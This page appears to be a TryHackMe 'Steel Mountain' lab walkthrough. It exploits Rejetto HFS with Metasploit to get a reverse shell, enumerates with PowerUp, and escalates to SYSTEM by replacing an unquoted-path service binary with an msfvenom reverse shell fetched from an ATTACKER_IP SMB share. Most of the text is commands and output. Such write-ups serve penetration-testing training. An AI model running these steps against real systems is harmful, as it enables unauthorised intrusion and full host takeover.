---
sidebar_position: 2
description: Steel Mountain
keywords: [steel mountain, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, privilege escalation, rejetto exploit, powerup, AdvancedSystemCareService9]
---


# Metasploit Exploitation

<br/>

- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>exploit/windows/http/rejetto_hfs_exec</span>
- <b style={{ color: 'HotPink' }}>PAYLOAD:</b> <span style={{fontWeight: 'Bold'}}>windows/x64/shell/reverse_tcp</span>

```log
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.32.61      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    4000             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

[*] Started reverse TCP handler on 10.10.20.30:4444 
[*] Using URL: http://10.10.20.30:4000/c9OfS9o
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /c9OfS9o
[*] Sending stage (336 bytes) to 10.10.32.61
[*] Command shell session 1 opened (10.10.20.30:4444 -> 10.10.32.61:49198) at 2022-10-10 07:19:16 +0200
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\IdUYf.vbs' on the target

Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> whoami
STEELMOUNTAIN\bill
```

<br/>

- Upgrading the Session to `Meterpreter`

```log
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.20.30:4433 
[*] Sending stage (200774 bytes) to 10.10.32.61
[*] Meterpreter session 2 opened (10.10.20.30:4433 -> 10.10.32.61:49200) at 2022-10-10 07:20:17 +0200
[*] Stopping exploit/multi/handler
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.3.9600] -----  10.10.20.30:4444 -> 10.10.32.61:49198 (10.10.32.61)
  2         meterpreter x64/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN                        10.10.20.30:4433 -> 10.10.32.61:49200 (10.10.32.61)
```

```log
meterpreter > getuid 
Server username: STEELMOUNTAIN\bill
meterpreter > sysinfo 
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

<br/>

- Enumering the Machine using <b style={{ color: 'DeepSkyBlue' }}>PowerUP (Powershell Script)</b>
- <a class="button button--outline button--info" href="https://github.com/samratashok/nishang">PowerUP GitHub</a>

```powershell
meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS >
```

```powershell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```


<br/>

- The <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service has <b style={{ color: 'Brown' }}>[Unquoted Service Paths] - [CanRestart = True].</b>
- <b style={{ color: 'Brown' }}>[Unquoted Service Paths]</b> When a Service is Created whose Executable Path contains Spaces and isn't Enclosed withing Quotes, allows a User to gain <b style={{ color: 'Red' }}>SYSTEM</b> Privileges <span style={{fontWeight: 'Bold'}}>(Only if the Vulnerable Service is running withing the SYSTEM).</span> This is because Windows handles the Space as Break and passes the rest of the Service <span style={{fontWeight: 'Bold'}}>PATH</span> as an <span style={{fontWeight: 'Bold'}}>Argument.</span>
- <b style={{ color: 'Brown' }}>[CanRestart = True]</b> Allows us to Restart a Service on the System. The Directory of the Application is also <span style={{fontWeight: 'Bold'}}>Writable.</span>


```powershell
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

<br/>
<br/>

- Generating the <span style={{fontWeight: 'Bold'}}>PAYLOAD</span> with <b style={{ color: 'IndianRed' }}>MSFVenom</b>

```js
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

<br/>

- Uploading the **PAYLOAD** using a simple `SMB` Server. After that we can replace the <span style={{fontWeight: 'Bold'}}>ASCService.exe</span> <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service with our <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>

```bash
attacker@machine:~$ mkdir /mnt/SMBShare
attacker@machine:~$ smbserver LINUXSHARE /mnt/SMBShare
```

- It is going to ask to Overwrite the file: `Yes`
   - **[It may be necessary to `stop` the Service]**

```log
C:\Program Files (x86)\IObit\Advanced SystemCare> sc stop AdvancedSystemCareService9
C:\Program Files (x86)\IObit\Advanced SystemCare>copy \\ATTACKER_IP\LINUXSHARE\ASCService.exe ASCService.exe
copy \\ATTACKER_IP\LINUXSHARE\ASCService.exe ASCService.exe
Overwrite ASCService.exe? (Yes/No/All): Yes
        1 file(s) copied.
```

<br/>
<br/>

- Restarting the <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service will Start our <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>

```log
C:\Program Files (x86)\IObit\Advanced SystemCare> sc start AdvancedSystemCareService9
```

<br/>



- Before restarting the <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service we can start a `Metasploit` Listener.
- <b style={{ color: 'HotPink' }}>Using:</b> <span style={{fontWeight: 'Bold'}}>multi/handler</span>
- <b style={{ color: 'HotPink' }}>PAYLOAD:</b> <span style={{fontWeight: 'Bold'}}>windows/x64/shell_reverse_tcp</span>
- We have **System Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>


```log
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.20.30      yes       The listen address (an interface may be specified)
   LPORT     4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

[*] Started reverse TCP handler on 10.10.20.30:4443 
[*] Command shell session 1 opened (10.10.20.30:4443 -> 10.10.32.61:49226) at 2022-10-10 07:29:47 +0200

Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          
C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM
```

---